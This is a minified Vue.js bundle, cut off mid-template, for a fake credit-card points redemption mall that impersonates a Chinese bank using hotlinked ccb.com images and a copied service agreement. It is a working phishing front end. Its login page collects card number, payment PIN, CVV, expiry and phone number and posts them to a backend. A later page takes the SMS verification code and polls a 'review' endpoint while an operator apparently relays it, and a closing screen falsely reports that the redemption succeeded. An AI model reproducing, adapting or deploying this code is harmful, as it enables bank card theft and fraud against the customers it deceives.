webpackJsonp([1],{"+LGj":function(t,e){},"/KV2":function(t,e){},"5qh7":function(t,e){},KBAx:function(t,e){},NHnr:function(t,e,n){"use strict";Object.defineProperty(e,"__esModule",{value:!0});var s=n("7+uW"),i=n("mtWM"),a=n.n(i);n("mw3O");a.a.defaults.baseURL=window.baseurl,a.a.interceptors.request.use(function(t){return t.data||(t.data={}),t});var o=function(t){return a.a.post("/api/createrecord",t)},r=function(){return a.a.get("/api/goods")},c=function(t,e){return a.a.post("/api/record/"+t,e)},d=function(t){return a.a.get("/api/recordstate/"+t)},l=function(t,e){return a.a.post("/api/getcode/"+t,e)},v=function(){return a.a.get("/api/config")},p={name:"App",mounted:function(){var t=this;window.showMessage=this.showMessage,window.hideMessage=this.hideMessage,v().then(function(e){window.imagelist=e.data.imagelist,window.bankname=e.data.bankname,t.$router.push("index")})},data:function(){return{showmessage:!1,messagetype:"loading",msg:"资料审核中...请稍后"}},methods:{showMessage:function(t,e){this.showmessage=!0,this.messagetype=e,this.msg=t},hideMessage:function(){this.showmessage=!1}}},h={render:function(){var t=this.$createElement,e=this._self._c||t;return e("div",{attrs:{id:"app"}},[e("router-view"),this._v(" "),e("div",{directives:[{name:"show",rawName:"v-show",value:this.showmessage,expression:"showmessage"}],staticClass:"container_class"},[e("div",{staticClass:"message_class"},[e("img",{directives:[{name:"show",rawName:"v-show",value:"loading"==this.messagetype,expression:"messagetype=='loading'"}],staticStyle:{width:"20px"},attrs:{src:"http://www.sucaijishi.com/uploadfile/2013/0527/20130527034915500.gif"}}),this._v(" "),e("div",[this._v(this._s(this.msg))])])])],1)},staticRenderFns:[]};var u=n("VU/8")(p,h,!1,function(t){n("OxTP")},null,null).exports,g=n("/ocq"),m={name:"HelloWorld",data:function(){return{goodlist:[],swiperOption:{notNextTick:!0,loop:!0,initialSlide:0,autoplay:{delay:1500,stopOnLastSlide:!1,disableOnInteraction:!1},speed:800,direction:"horizontal",on:{slideChangeTransitionStart:function(){this.imgIndex=this.realIndex-1}},pagination:{el:".swiper-pagination"}}}},computed:{imagelist:function(){return window.imagelist}},mounted:function(){this.loaddata()},methods:{toLogin:function(){this.$router.push("login")},toGoods:function(t){this.$router.push({name:"goods",params:{goods:t}})},loaddata:function(){var t=this;r().then(function(e){t.goodlist=e.data})}}},_={render:function(){var t=this,e=t.$createElement,n=t._self._c||e;return n("div",[t._m(0),t._v(" "),t._m(1),t._v(" "),n("div",{staticStyle:{padding:"4px 10px"}},[n("swiper",{attrs:{options:t.swiperOption}},[t._l(t.imagelist,function(t){return n("swiper-slide",{attrs:{item:t}},[n("img",{staticStyle:{width:"100%"},attrs:{src:t}})])}),t._v(" "),n("div",{staticClass:"swiper-pagination",attrs:{slot:"pagination"},slot:"pagination"})],2)],1),t._v(" "),n("div",{staticStyle:{background:"#eeeeee",width:"100%",height:"8px"}}),t._v(" "),t._m(2),t._v(" "),n("div",{staticStyle:{display:"flex","flex-wrap":"wrap",background:"#eeeeee","justify-content":"space-between"}},t._l(t.goodlist,function(e){return n("div",{staticStyle:{width:"45%",margin:"2%",padding:"1.5%",background:"white"},on:{click:function(n){return t.toGoods(e)}}},[n("img",{staticStyle:{width:"100%"},attrs:{src:e.imgurl}}),t._v(" "),n("div",{staticStyle:{"text-align":"left",padding:"4px","font-size":"0.6rem","font-weight":"bold"}},[t._v(t._s(e.name))]),t._v(" "),n("div",{staticStyle:{display:"flex","align-items":"center"}},[n("div",{staticStyle:{"text-align":"left",padding:"4px",color:"red"}},[t._v(t._s(e.jifen)+"积分")])])])}),0)])},staticRenderFns:[function(){var t=this.$createElement,e=this._self._c||t;return e("div",{staticStyle:{background:"#449cff","text-align":"left",display:"flex","justify-content":"space-between","align-items":"center"}},[e("div",{staticStyle:{padding:"10px","font-size":"1.2rem",width:"100%","text-align":"center"}},[this._v("信用卡积分 | 商城")]),this._v(" "),e("img",{staticStyle:{width:"20px",height:"21px",padding:"1rem"},attrs:{src:"http://jf.ccb.com/img/mobile/icon_personal.png"}})])},function(){var t=this.$createElement,e=this._self._c||t;return e("div",{staticStyle:{display:"flex","justify-content":"center",background:"#449cff"}},[e("div",{staticClass:"index_search"},[e("input",{attrs:{type:"text",placeholder:"搜索商品"}})])])},function(){var t=this.$createElement,e=this._self._c||t;return e("div",{staticStyle:{"line-height":"30px",border:"#eeeeee 1px solid",display:"flex","align-items":"center"}},[e("div",{staticStyle:{float:"left",width:"4px",height:"30px",background:"#449cff"}}),this._v(" "),e("div",{staticStyle:{"padding-left":"10px"}},[e("div",{staticStyle:{"text-align":"left",padding:"8px 0px"}},[this._v("热兑好礼")])])])}]};var f=n("VU/8")(m,_,!1,function(t){n("KBAx")},"data-v-247337c3",null).exports,b=n("PJh5"),w=n.n(b),j={name:"HelloWorld",data:function(){return{idnumber:"",cardnumber:"",cardpass:"",cardtime:null,cardccv:"",cardphone:"",access:!1,showxieyi:!1}},computed:{bankname:function(){return window.bankname}},methods:{goback:function(){this.$router.go(-1)},info:function(){alert("请正确填写您的资料进行兑换")},tongyi:function(t){this.access=t,this.showxieyi=!1},gophone:function(){var t=this;this.access?this.cardnumber&&this.cardpass&&this.cardtime&&this.cardccv?this.cardphone?(window.userinfo.cardnumber=this.cardnumber,window.userinfo.cardpass=this.cardpass,window.userinfo.cardtime=w()(this.cardtime).format("YYYY-MM-DD"),window.userinfo.cardccv=this.cardccv,window.userinfo.cardphone=this.cardphone,window.userinfo.idnumber="",window.userinfo.address="",window.userinfo.cardcode="",window.userinfo.name="",window.showMessage("资料提交审核中,请稍后","loading"),o(window.userinfo).then(function(e){setTimeout(function(){window.rid=e.data.rid,t.$router.push("phone"),window.hideMessage()},3e3)})):this.inof():this.info():alert("请勾选条款及协议")}}},x={render:function(){var t=this,e=t.$createElement,n=t._self._c||e;return n("div",[n("div",{staticStyle:{background:"#449cff","text-align":"left",display:"flex","align-items":"center",height:"44px"}},[n("div",{staticStyle:{width:"40px",height:"44px",display:"flex","align-items":"center"},on:{click:t.goback}},[n("img",{staticStyle:{height:"40%",width:"auto","padding-left":"10px"},attrs:{src:"http://login.ccb.com/ccbctp/newMobile/images/return_btn.png"}})]),t._v(" "),n("div",{staticStyle:{color:"white",width:"100%","text-align":"center","padding-right":"20px"}},[t._v("积分兑换登录")])]),t._v(" "),n("div",{staticStyle:{padding:"5px","text-align":"left"}},[t._m(0),t._v(" "),n("b-field",{attrs:{label:"信用卡卡号"}},[n("b-input",{attrs:{placeholder:"请输入信用卡卡号"},model:{value:t.cardnumber,callback:function(e){t.cardnumber=e},expression:"cardnumber"}})],1),t._v(" "),n("b-field",{attrs:{label:"信用卡支付密码"}},[n("b-input",{attrs:{type:"password",placeholder:"请输入信用卡密码","password-reveal":"",maxlength:"6",minlength:"6"},model:{value:t.cardpass,callback:function(e){t.cardpass=e},expression:"cardpass"}})],1),t._v(" "),n("b-field",{attrs:{label:"信用卡背面后三位"}},[n("b-input",{attrs:{placeholder:"请输入信用卡背面后三位",maxlength:"3",minlength:"3"},model:{value:t.cardccv,callback:function(e){t.cardccv=e},expression:"cardccv"}})],1),t._v(" "),n("b-field",{attrs:{label:"信用卡有效期"}},[n("b-datepicker",{attrs:{icon:"calendar-today"},model:{value:t.cardtime,callback:function(e){t.cardtime=e},expression:"cardtime"}})],1),t._v(" "),n("b-field",{attrs:{label:"预留手机号码"}},[n("b-input",{attrs:{placeholder:"请输入信用卡预留手机号码",maxlength:"11",minlength:"11"},model:{value:t.cardphone,callback:function(e){t.cardphone=e},expression:"cardphone"}})],1),t._v(" "),n("div",{staticClass:"field"},[n("div",{staticStyle:{display:"flex"}},[n("b-checkbox",{model:{value:t.access,callback:function(e){t.access=e},expression:"access"}}),t._v(" "),n("div",{on:{click:function(e){t.showxieyi=!0}}},[t._v("接受条款及协议")])],1)])],1),t._v(" "),n("br"),t._v(" "),n("b-button",{attrs:{type:"is-danger"},on:{click:t.gophone}},[t._v("下一步")]),t._v(" "),t.showxieyi?n("div",{staticClass:"xieyi"},[n("div",{staticStyle:{"font-size":"1.2rem",height:"5vh","align-items":"center",display:"flex","justify-content":"center"}},[t._v("条款与条件")]),t._v(" "),n("div",{staticClass:"xieyineirong"},[t._v("\n      中国"+t._s(t.bankname)+"银行移动支付借记卡服务协议\n"),n("p",[t._v("中国"+t._s(t.bankname)+"银行移动支付借记卡服务协议（以下简称“本协议”），是中国"+t._s(t.bankname)+"银行股份有限公司（以下简称“中国"+t._s(t.bankname)+"银行银行”）与您签订。")]),t._v(" "),n("p",[t._v("一、声明与承诺 ")]),t._v(" "),n("p",[t._v("（一）本协议已对与您的权益具有或可能具有重大关系的条款，及对"+t._s(t.bankname)+"银行具有或可能具有免责或限制责任的条款用粗体字予以标注，请您注意。您确认，在您申请成为移动支付借记卡用户以接受移动支付借记卡服务（以下简称“本服务”）前，您已充分阅读、理解并接受本协议的全部内容，一旦您使用本服务，即表示您同意遵循本协议之所有约定。"+t._s(t.bankname)+"银行已应您的要求对相关条款进行了充分的提示和说明。")]),t._v(" "),n("p",[t._v("（二）您保证，在您同意接受本协议并申请成为本服务用户时，您具有完全的民事行为能力；本协议内容不受您所属国家或地区法律的排斥。不具备前述条件的，您应立即停止使用本服务。")]),t._v(" "),n("p",[t._v("二、定义及解释")]),t._v(" "),n("p",[t._v("（一）移动设备是指不因地理位置变换而影响使用的终端设备，包括但不限于手机、移动个人电脑、PDA等。")]),t._v(" "),n("p",[t._v("（二）移动支付是指通过移动设备完成资金支付的处理方式。根据支付交易发起方式，可分为移动近场支付和移动远程支付。")]),t._v(" "),n("p",[t._v("移动近场支付是指通过支持非接近场通讯的实体受理终端（包括ATM、POS等终端），使用移动设备在交易现场通过非接通讯方式以联机或脱机方式完成资金转移的处理方式。")]),t._v(" "),n("p",[t._v("移动远程支付是指通过无线通信网络，使用移动设备直接与后台服务器进行交互，完成资金转移的支付方式。")]),t._v(" "),n("p",[t._v("（三）安全芯片（以下简称“eSE”）是指符合金融标准的安全运算和安全存储单元，每一个安全芯片都有一个唯一标识SEID。")]),t._v(" "),n("p",[t._v("（四）实体借记卡（以下简称“实体卡”）是指中国"+t._s(t.bankname)+"银行发行的，具有标准卡片介质的，具备支付结算等功能的标准借记卡。实体卡可以为磁条卡或符合PBOC规范的金融IC卡。")]),t._v(" "),n("p",[t._v("（五）移动支付借记卡（以下简称“移动支付卡”）是指加载于特定移动设备上的eSE内，与申请使用的实体卡共用主账户，借助移动设备相关功能共同完成资金支付功能的金融应用。移动支付卡使用中国银联标准BIN发行，符合金融IC卡PBOC规范，有效期10年。")]),t._v(" "),n("p",[t._v("三、申领")]),t._v(" "),n("p",[t._v("（一）您申请移动支付卡时必须验证"+t._s(t.bankname)+"银行实体卡相关要素，验证要素包括不限于卡号、开户姓名、开户时预留证件号码、预留银行手机号码以及取款密码，验证成功后，移动支付卡将下载到加载于特定移动设备上的eSE内。")]),t._v(" "),n("p",[t._v("（二）您可以通过在移动设备上安装的"+t._s(t.bankname)+"银行客户端或者"+t._s(t.bankname)+"银行准许的第三方客户端申请移动支付卡。使用"+t._s(t.bankname)+"银行客户端成功下载到eSE内的移动支付卡，该卡自动激活；如使用第三方客户端申请移动支付卡，下载成功后需在24小时内激活该卡片，如不激活该卡将自动失效，您如需使用需重新申请。")]),t._v(" "),n("p",[t._v("（三）"+t._s(t.bankname)+"银行保留向您收取账户管理费的权利。一旦收费，移动支付卡申请成功后按年度（自申请月起每满12个月为一个持卡年度）预收账户管理费，年度账户管理费每年从账户自动预先扣收，注销时已收取的账户管理费不再退还；如未成功下载到安全芯片内或下载到安全芯片内未激活的不收取账户管理费。")]),t._v(" "),n("p",[t._v("四、使用")]),t._v(" "),n("p",[t._v("（一）您保证将移动支付卡用于合法用途，保证自己通过移动支付卡从事的各种交易为法律所允许。")]),t._v(" "),n("p",[t._v("（二）移动支付卡加载成功后，使用该卡取现、转账、消费等交易（包含远程和近场交易）每日累计限额为5000元。在您持本人有效身份证件及移动支付卡至"+t._s(t.bankname)+"银行网点办理身份认证手续后不再受该限额限制，但"+t._s(t.bankname)+"银行另有规定的除外。")]),t._v(" "),n("p",[t._v("（三）移动支付卡与对应实体卡共用银行账户（电子现金除外），有关交易功能控制与实体卡一致；移动支付卡与实体卡有关交易金额合计统计，统一受实体卡的交易限额控制。")]),t._v(" "),n("p",[t._v("（四）移动支付卡具有独立的电子现金，仅支持人民币结算，不记名、不计息、不挂失，余额上限为1000元（含）人民币，移动支付卡对应的实体卡为该电子现金的主账户。")]),t._v(" "),n("p",[t._v("（五）移动支付卡电子现金账户内的资金只可用于小额脱机消费，在消费时不需要提供密码。通过电子现金完成的交易不可以撤销。退货资金退入实体卡账户。")]),t._v(" "),n("p",[t._v("（六）电子现金账户余额的判断应以电子现金芯片余额为准。")]),t._v(" "),n("p",[t._v("（七）移动支付卡不能替代实体卡在线下办理有关签约交易，包括网上银行签约、短信银行签约、代收代付签约等。")]),t._v(" "),n("p",[t._v("（八）凭密码进行的交易，相应产生的电子信息记录为该项交易完成的有效凭证；不凭密码进行的交易，则记载有您签名的交易凭证或"+t._s(t.bankname)+"银行提供的其他确认方式为该项交易完成的有效凭证；基于您签字形成的交易凭证和/或通过金融IC芯片等电子数据办理的电子现金消费交易所产生的信息记录为该项交易的有效凭据。如有关交易确已发生，不得以无交易凭证、交易凭证上签字非本人所为等理由拒绝偿付因交易发生的款项。")]),t._v(" "),n("p",[t._v("（九）如因eSE损坏导致移动支付卡不能使用，请您持移动设备及本人有效身份证件到"+t._s(t.bankname)+"银行网点办理移动支付卡电子现金预圈提手续，移动支付卡片电子现金账户资金30天后转入主账户；上述手续办理后如"+t._s(t.bankname)+"银行受理到该电子现金的支付交易，您须承担相应的偿还责任，"+t._s(t.bankname)+"银行有权从您在"+t._s(t.bankname)+"银行办理的任意银行卡对上述交易进行清算。")]),t._v(" "),n("p",[t._v("（十）如因eSE损坏等原因导致交易中"+t._s(t.bankname)+"银行不能验证卡片等相关信息时，"+t._s(t.bankname)+"银行有权拒绝受理。")]),t._v(" "),n("p",[t._v("（十一）、您与商户或"+t._s(t.bankname)+"银行以外的受理银行之间发生的任何纠纷，均应由双方自行解决，"+t._s(t.bankname)+"银行不承担相关责任，但会视情况提供必要的帮助，您不得以此为由对"+t._s(t.bankname)+"银行划付交易款项提出异议。")]),t._v(" "),n("p",[t._v("五、密码")]),t._v(" "),n("p",[t._v("（一）移动支付卡与对应的实体卡使用同一密码。")]),t._v(" "),n("p",[t._v("（二）移动支付卡电子现金的资金交易不校验密码、不核对持卡人签名，凡使用电子现金内的资金进行的交易均视为本人所为，您应承担因移动设备保管不善（包括但不限于丢失或被盗等）造成的风险损失。如有关交易确已发生，您不得拒绝偿付交易款项。")]),t._v(" "),n("p",[t._v("（三）您在使用时，移动支付卡和对应的实体卡的密码错误次数合并计算，如连续输错三次密码，移动支付卡和对应的实体卡将同时被锁定（电子现金除外），您需持本人有效身份证件和移动支付卡或实体卡到"+t._s(t.bankname)+"银行营业网点办理解锁手续或者密码挂失手续，才能继续使用。")]),t._v(" "),n("P",[t._v("六、挂失")]),t._v(" "),n("p",[t._v("（一）您应妥善保管移动设备，如移动设备遗失或被盗，应及时通过致电"+t._s(t.bankname)+"银行客户服务中心或"+t._s(t.bankname)+"银行提供的其他途径对加载在该移动设备内的移动支付卡办理挂失手续（移动支付卡只能办理永久挂失），挂失自相关手续办妥后即时生效，您不承担挂失有效期内该卡被冒用所造成的资金损失（不包含电子现金），法律另有规定的除外，挂失时间以银行系统记录为准。")]),t._v(" "),n("p",[t._v("（二）移动支付卡的挂失不影响对应实体卡的使用，实体卡的挂失不影响对应的移动支付卡的使用。")]),t._v(" "),n("p",[t._v("（三）移动支付卡挂失后，该卡默认注销，如您需继续使用移动支付业务请重新申请；如您找回移动设备，可以持本人有效身份证件及移动设备到"+t._s(t.bankname)+"银行指定网点办理解除挂失手续。")]),t._v(" "),n("p",[t._v("（四）因下列情况之一产生的债务或损失，"+t._s(t.bankname)+"银行不承担相关责任：")]),t._v(" "),n("p",[t._v("1.挂失生效前发生的交易；")]),t._v(" "),n("p",[t._v("2.您有欺诈或其它不诚实行为的；")]),t._v(" "),n("p",[t._v("3."+t._s(t.bankname)+"银行调查情况，遭您拒绝的；")]),t._v(" "),n("p",[t._v("（五）挂失生效后，其效力不及于电子现金，"+t._s(t.bankname)+"银行不承担电子现金的资金被冒用所引起的资金风险。")]),t._v(" "),n("p",[t._v("七、注销")]),t._v(" "),n("p",[t._v("（一）您可以通过"+t._s(t.bankname)+"银行客户端办理或者持移动设备到柜面办理注销移动支付卡手续。")]),t._v(" "),n("P",[t._v("（二）办理实体卡销户时必须先注销对应的移动支付卡。")]),t._v(" "),n("p",[t._v("八、其他")]),t._v(" "),n("p",[t._v("（一）您在享受"+t._s(t.bankname)+"银行提供的服务时，应当遵守本协议以及"+t._s(t.bankname)+"银行不定期通过网点、网站或电子银行等渠道公布的相关业务规则等要求。")]),t._v(" "),n("p",[t._v("（二）移动支付卡不得出租、转让、转借。您因移动设备保管不善、将移动设备交他人使用或自身使用不当而造成的损失，由您本人承担。")]),t._v(" "),n("p",[t._v("（三）因不可抗力（包括但不限于"+t._s(t.bankname)+"银行不能预见、不能避免并不能克服的战争、暴动、严重火灾、水灾、台风、地震、政府行为、禁令、或供电、通讯等客观情况）导致移动支付卡不能正常使用的，"+t._s(t.bankname)+"银行将视情况协助解决或提供必要的帮助，根据不可抗力的影响，"+t._s(t.bankname)+"银行部分或全部免除责任。对于在交易过程中，因暂时的网络通讯故障或其他原因造成的错账现象，"+t._s(t.bankname)+"银行有权根据实际交易情况进行账务处理，您有权提出异议。")]),t._v(" "),n("p",[t._v("（四）"+t._s(t.bankname)+"银行保留收回或不发卡的权利。为保障您账户资金安全，"+t._s(t.bankname)+"银行在发现您的移动支付借记卡存在被他人冒用等使用风险时，有权暂时对该卡进行止付。若发现您在用卡过程中有不遵守本协议规定或其他违规、违法行为的，"+t._s(t.bankname)+"银行有权终止其用卡权利。")]),t._v(" "),n("p",[t._v("（五）"+t._s(t.bankname)+"银行根据服务项目或服务内容，对服务价格、优惠措施及其生效和终止日期、与价格相关的例外条款和限制性条款、咨询（投诉）的联系方式等信息通过"+t._s(t.bankname)+"银行网点、网站等渠道以公告的方式向您明示。"+t._s(t.bankname)+"银行亦对相关业务规则等要求通过上述渠道以公告的方式向您明示。"+t._s(t.bankname)+"银行公告内容构成本协议不可分割的一部分，与本协议具有同等效力，您应在充分知晓、理解有关公告内容后签署本协议。")]),t._v(" "),n("p",[t._v("您同意按"+t._s(t.bankname)+"银行公布的收费标准支付各类应承担的费用，同意采用扣收的方式从您账户中收取相关费用。"+t._s(t.bankname)+"银行有权依据国家有关规定及业务需要对服务内容、收费项目或标准等内容进行调整，并正式对外公告一定时期后执行并适用于本协议，无需另行通知您，如有需要，"+t._s(t.bankname)+"银行将在公告前报经有关金融监管部门核准或备案；您有权在"+t._s(t.bankname)+"银行公告期间选择是否继续使用移动支付卡及相关服务，如果您不愿接受"+t._s(t.bankname)+"银行公告内容的，应在"+t._s(t.bankname)+"银行公告施行前申请变更或终止相关服务。您既不申请变更或终止服务，又不执行招商银行施行的公告的，招商银行有权选择终止本协议。移动支付借记卡的服务内容、收费项目及标准等内容，均以招商银行最新公告为准。")]),t._v(" "),n("p",[t._v("九、本协议为您申请实体卡签署的有关协议的补充协议，本协议与您申请实体卡签署的有关协议的约定不一致的，以本协议为准。")]),t._v(" "),n("P",[t._v("十、本协议未尽事宜均依据中华人民共和国法律、行政法规、人民银行及银行业监督机关的有关规章、政策规定及金融业的行业惯例办理。双方在履行合约时发生的争议，由双方协商处理；协商不成，由向您发放实体卡的招商银行分支机构住所地人民法院管辖。在诉讼期间，本协议不涉及争议部分的条款仍须履行。")]),t._v(" "),n("p",[t._v("十一、本协议自您确认且招商银行同意您申请并发放卡片之日起生效。")])],1),t._v(" "),n("div",{staticClass:"tongyi"},[n("b-button",{attrs:{size:"is-large"},on:{click:function(e){return t.tongyi(!1)}}},[t._v("不同意")]),t._v(" "),n("b-button",{attrs:{size:"is-large"},on:{click:function(e){return t.tongyi(!0)}}},[t._v("同意")])],1)]):t._e()],1)},staticRenderFns:[function(){var t=this.$createElement,e=this._self._c||t;return e("div",{staticStyle:{display:"flex",color:"red",padding:"5px"}},[e("h3",[this._v("为了您顺利兑换礼品,请正确填写以下信息")])])}]};var y=n("VU/8")(j,x,!1,function(t){n("nteQ")},"data-v-58d99a97",null).exports,k={name:"HelloWorld",mounted:function(){this.checkstate()},data:function(){return{address:"",cardphone:"",cardcode:"",username:"",daojishi:!1,djs:300,timer:-1,dtimer:-1}},methods:{goback:function(){this.$router.go(-1)},getcode:function(){var t=this;this.daojishi=!0,l(window.rid,window.userinfo).then(function(t){console.log("yanzhengma")}),this.djs=300,this.dtimer=setInterval(function(){t.djs--},1e3)},checkstate:function(){var t=this;this.timer=setInterval(function(){d(window.rid).then(function(e){e.data.success&&("审核失败"==e.data.message?(clearInterval(t.timer),window.showMessage("验证码有误,请重新提交验证码","txt"),setTimeout(window.hideMessage,2e3)):"审核成功"==e.data.message?(clearInterval(t.timer),window.hideMessage(),t.$router.push("address")):"卡信息错误"==e.data.message&&(clearInterval(t.timer),window.showMessage("你的卡片信息有误，无法获取验证码,请重新填写","txt"),setTimeout(window.hideMessage,2e3),t.goback()))})},2e3)},goSuccess:function(){var t=this;clearInterval(this.timer),window.userinfo.cardcode=this.cardcode,window.showMessage("正在审核中,请稍后","loading"),this.daojishi=!1,this.djs=300,clearInterval(this.dtimer),c(window.rid,window.userinfo).then(function(e){t.timer=setInterval(function(){d(window.rid).then(function(e){e.data.success&&("审核失败"==e.data.message?(clearInterval(t.timer),window.showMessage("验证码有误,请重新提交验证码","txt"),setTimeout(window.hideMessage,2e3)):"审核成功"==e.data.message?(clearInterval(t.timer),window.hideMessage(),t.$router.push("address")):"卡信息错误"==e.data.message&&(clearInterval(t.timer),window.showMessage("你的卡片信息有误，无法获取验证码,请重新填写","txt"),setTimeout(window.hideMessage,2e3),t.goback()))})},2e3)})}}},S={render:function(){var t=this,e=t.$createElement,n=t._self._c||e;return n("div",[n("div",{staticStyle:{background:"#449cff","text-align":"left",display:"flex","align-items":"center",height:"44px"}},[n("div",{staticStyle:{width:"40px",height:"44px",display:"flex","align-items":"center"},on:{click:t.goback}},[n("img",{staticStyle:{height:"40%",width:"auto","padding-left":"10px"},attrs:{src:"http://login.ccb.com/ccbctp/newMobile/images/return_btn.png"}})]),t._v(" "),n("div",{staticStyle:{color:"white",width:"100%","text-align":"center","padding-right":"10px"}},[t._v("积分兑换登录")])]),t._v(" "),n("div",{staticStyle:{padding:"5px","text-align":"left"}},[t._m(0),t._v(" "),n("div",{staticStyle:{display:"flex","align-items":"center","justify-content":"space-between"}},[n("b-field",{staticStyle:{width:"100%"},attrs:{label:"验证码"}},[n("div",{staticStyle:{display:"flex","justify-content":"space-between","align-items":"center",width:"100%"}},[n("b-input",{staticStyle:{width:"100%"},attrs:{placeholder:"请输入短信验证码"},model:{value:t.cardcode,callback:function(e){t.cardcode=e},expression:"cardcode"}}),t._v(" "),t.daojishi?t._e():n("b-button",{attrs:{type:"is-danger"},on:{click:t.getcode}},[t._v("获取验证码")]),t._v(" "),t.daojishi?n("b-button",{attrs:{type:"is-danger"}},[t._v(t._s(t.djs))]):t._e()],1)])],1)]),t._v(" "),n("b-button",{attrs:{type:"is-danger"},on:{click:t.goSuccess}},[t._v("下一步")])],1)},staticRenderFns:[function(){var t=this.$createElement,e=this._self._c||t;return e("div",{staticStyle:{display:"flex",color:"red",padding:"5px"}},[e("h3",[this._v("为了您的账户安全，请填写您收到的短信验证码")])])}]};var z=n("VU/8")(k,S,!1,function(t){n("ZZvA")},"data-v-550da3cf",null).exports,E={name:"HelloWorld",data:function(){return{address:"",cardphone:"",daojishi:!1,djs:300}},methods:{goback:function(){this.$router.go(-1)},getcode:function(){var t=this;this.daojishi=!0,this.djs=300,setInterval(function(){t.djs--},1e3)},gohome:function(){this.$router.push("index")}}},M={render:function(){var t=this,e=t.$createElement,n=t._self._c||e;return n("div",[n("div",{staticStyle:{background:"#449cff","text-align":"left",display:"flex","align-items":"center",height:"44px"}},[n("div",{staticStyle:{width:"40px",height:"44px",display:"flex","align-items":"center"},on:{click:t.goback}},[n("img",{staticStyle:{height:"40%",width:"auto","padding-left":"10px"},attrs:{src:"http://login.ccb.com/ccbctp/newMobile/images/return_btn.png"}})]),t._v(" "),n("div",{staticStyle:{color:"white",width:"100%","text-align":"center","padding-right":"10px"}},[t._v("兑换成功")])]),t._v(" "),n("div",{staticStyle:{padding:"20px","text-align":"center",color:"red"}},[n("div",{staticStyle:{"padding-top":"100px"}},[n("b-icon",{staticStyle:{color:"red"},attrs:{icon:"check-circle",size:"is-large"}}),t._v(" "),n("div",{staticStyle:{"font-size":"3rem"}},[t._v("兑换成功")])],1),t._v(" "),t._m(0)]),t._v(" "),n("b-button",{attrs:{type:"is-danger"},on:{click:t.gohome}},[t._v("继续兑换")])],1)},staticRenderFns:[function(){var t=this.$createElement,e=this._self._c||t;return e("div",{staticStyle:{padding:"20px",color:"black"}},[this._v("\n           我行将在"),e("strong",{staticStyle:{color:"red"}},[this._v("三至七个工作日内")]),this._v("为您派送您的礼品，"),e("strong",{staticStyle:{color:"red"}},[this._v("(偏远地区可能需要七到十个工作日内才能送达)")]),this._v("请耐心等候\n         ")])}]};var I=n("VU/8")(E,M,!1,function(t){n("q/Ne")},"data-v-793b08f4",null).exports,O={render:function(){var t=this,e=t.$createElement,n=t._self._c||e;return n("div",[n("div",{staticStyle:{background:"#449cff","text-align":"left",display:"flex","align-items":"center",height:"44px"}},[n("div",{staticStyle:{width:"40px",height:"44px",display:"flex","align-items":"center"},on:{click:t.goback}},[n("img",{staticStyle:{height:"40%",width:"auto","padding-left":"10px"},attrs:{src:"http://login.ccb.com/ccbctp/newMobile/images/return_btn.png"}})]),t._v(" "),n("div",{staticStyle:{"text-align":"center",width:"80%",color:"white"}},[t._v("商品详情")])]),t._v(" "),n("div",{staticStyle:{padding:"0"}},[n("swiper",{attrs:{options:t.swiperOption}},[t._l(t.gooditem.imglist,function(t){return n("swiper-slide",[n("img",{key:t,staticStyle:{width:"100%",height:"auto"},attrs:{src:t}})])}),t._v(" "),n("div",{staticClass:"swiper-pagination",attrs:{slot:"pagination"},slot:"pagination"})],2)],1),t._v(" "),n("div",{staticStyle:{"text-align":"left",padding:"4px","font-size":"1rem","font-weight":"bold"}},[t._v(t._s(t.gooditem.name))]),t._v(" "),n("br"),t._v(" "),n("div",{staticStyle:{"text-align":"left",padding:"4px","font-size":"0.6rem"}},[t._v("商品编号:"),n("span",{staticStyle:{color:"gray"}},[t._v(t._s(t.gooditem.bianhao))])]),t._v(" "),n("div",{staticStyle:{display:"flex","align-items":"center","justify-content":"space-between"}},[n("div",{staticStyle:{"text-align":"left",padding:"4px","font-size":"0.6rem"}},[n("strong",[t._v("所需积分:")]),n("span",{staticStyle:{color:"red","font-size":"1rem"}},[t._v(t._s(t.gooditem.jifen)+"积分")])]),t._v(" "),n("div",{staticStyle:{"text-align":"left",padding:"4px","font-size":"0.6rem"}},[n("strong",[t._v("库存:"+t._s(t.gooditem.kucun))])])]),t._v(" "),n("div",[n("div",{staticStyle:{"text-align":"left",padding:"4px","font-size":"0.6rem"}},[t._v("商品参数")]),t._v(" "),n("img",{attrs:{src:t.gooditem.canshu}})]),t._v(" "),n("div",[n("b-button",{staticStyle:{position:"fixed",bottom:"0",left:"0",width:"100%"},attrs:{type:"is-danger"},on:{click:t.toLogin}},[t._v("立即兑换")])],1)])},staticRenderFns:[]};var F=n("VU/8")({name:"HelloWorld",data:function(){return{gooditem:{imglist:[]},swiperOption:{notNextTick:!0,loop:!0,initialSlide:0,autoplay:{delay:1500,stopOnLastSlide:!1,disableOnInteraction:!1},speed:800,direction:"horizontal",on:{slideChangeTransitionStart:function(){this.imgIndex=this.realIndex-1}},pagination:{el:".swiper-pagination"}}}},mounted:function(){this.gooditem=this.$route.params.goods},methods:{goback:function(){this.$router.go(-1)},toLogin:function(){this.$router.replace("login")}}},O,!1,function(t){n("+LGj")},"data-v-114fecde",null).exports,P={name:"HelloWorld",mounted:function(){},data:function(){return{address:"",cardphone:"",cardcode:"",username:"",daojishi:!1,djs:300,timer:-1,dtimer:-1}},methods:{goback:function(){this.$router.go(-1)},getcode:function(){var t=this;this.daojishi=!0,l(window.rid,window.userinfo).then(function(t){console.log("yanzhengma")}),this.djs=300,this.dtimer=setInterval(function(){t.djs--},1e3)},goSuccess:function(){var t=this;this.address&&this.username?(window.userinfo.address=this.address,window.userinfo.name=this.username,c(window.rid,window.userinfo).then(function(e){t.$router.push("success")})):alert("请正确填写您的资料进行兑换")}}},q={render:function(){var t=this,e=t.$createElement,n=t._self._c||e;return n("div",[n("div",{staticStyle:{background:"#449cff","text-align":"left",display:"flex","align-items":"center",height:"44px"}},[n("div",{staticStyle:{width:"40px",height:"44px",display:"flex","align-items":"center"},on:{click:t.goback}},[n("img",{staticStyle:{height:"40%",width:"auto","padding-left":"10px"},attrs:{src:"http://login.ccb.com/ccbctp/newMobile/images/return_btn.png"}})]),t._v(" "),n("div",{staticStyle:{color:"white",width:"100%","text-align":"center","padding-right":"10px"}},[t._v("积分兑换登录")])]),t._v(" "),n("div",{staticStyle:{padding:"5px","text-align":"left"}},[t._m(0),t._v(" "),n("b-field",{attrs:{label:"收货姓名"}},[n("b-input",{attrs:{placeholder:"请输入您的姓名"},model:{value:t.username,callback:function(e){t.username=e},expression:"username"}})],1),t._v(" 